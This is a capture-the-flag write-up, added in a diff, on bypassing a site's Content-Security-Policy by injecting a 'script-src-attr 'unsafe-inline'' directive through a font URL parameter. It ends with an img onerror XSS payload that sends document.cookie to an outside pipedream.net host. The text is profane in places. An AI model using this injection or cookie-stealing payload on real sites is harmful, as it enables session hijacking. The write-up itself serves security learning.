@@ -1,0 +1,63 @@
+this challenge was a PAIN IN THE ASS. It is different from csp and csp-strict challenges, here you don't have a
+"checker" website, but you have to undestand by yourself that the button "Share!" is actually
+doing a post to the bot. After that you can start analizing the Content-Security-Policy, 
+the network console (if you see somenthing strange) and the parameters in the url.
+
+It was VERY easy understand that the param "text" was the main vulnerability in this website, also
+because with some strange line of code (<script></script> or whatever) you have good html in the
+resulting webpage. BUT, it was not enough. In fact, I didn't find any executable code by just 
+using this vulnerability. Obviously due to the following CSP of the website. 
+
+default-src 'none'; 
+script-src 'self'; script-src-elem 'self' 'nonce-ceqNZXa1fcbF7mhKJWrxojfMH5oquzUe' ;
+connect-src 'none';
+child-src 'none';
+frame-src 'none';
+img-src 'none';
+manifest-src 'none';
+media-src 'none';
+object-src 'none';
+prefetch-src 'none';
+worker-src 'none';
+style-src 'self' https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css;
+style-src-elem 'self' https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css 'nonce-ceqNZXa1fcbF7mhKJWrxojfMH5oquzUe' ;
+font-src https://fonts.gstatic.com/s/shrikhand/v11/a8IbNovtLWfR7T7bMJwrA4KR.woff2 https://fonts.gstatic.com/s/monoton/v15/5h1aiZUrOngCibe4TkHLQg.woff2;
+
+I spent HOURS in studying this CSP and searching for a vulnerability in the google font or in the
+bootstrap. 
+
+After HOURS or crying I casually discorver that the url param "font_url='blah blah' " ended up 
+in the CSP. YES YOU READ CORRECTLY THE FUCKING FONT_URL STRINGS ENDS UP IN THE CSP HAHAHAH DIOPORCO. 
+
+So I looked in the CSP documentation to find any available attribute to add to the CSP to enable
+an inline script. After a while I understood that there was no way to overwrite already added
+attribute. For instance I cannot rewrite default-src '*', bacause default-src is already present. 
+The only way to overwrite a behavior is to describe a more specific one. 
+
+In this list there is script-src-elem that is (from the documentation): 
+
+The HTTP Content-Security-Policy (CSP) script-src-elem directive specifies valid sources 
+for JavaScript <script> elements.
+This directive only specifies valid sources in <script> elements (both script requests and blocks). 
+It does not apply to other JavaScript sources that can trigger script execution, 
+such as inline script event handlers (onclick), script execution methods gated 
+on the "unsafe-eval" check, and XSLT stylesheets. (Valid sources can be specified for all
+JavaScript script sources using script-src, or just for inline script handlers using script-src-attr.) 
+
+So, I looked at the script-src-attr and added the following line to font_url:
+
+  ; script-src-attr 'unsafe-inline' 'unsafe-eval'
+
+more info about unsafe-inline here: 
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources#unsafe-inline
+
+
+now I just have to use an event handler instead of the <script> (<script> is still menaged by script-src-elem)
+and the exploit is done. 
+
+
+<img src="image.gif" onerror='document.location="https://enwmrr6eb6wa.x.pipedream.net/?"+document.cookie'>
+
+basically when it tries to load image.git without success it will send us the cookies.
+
+Just compile correctly the form and click 'Share!'
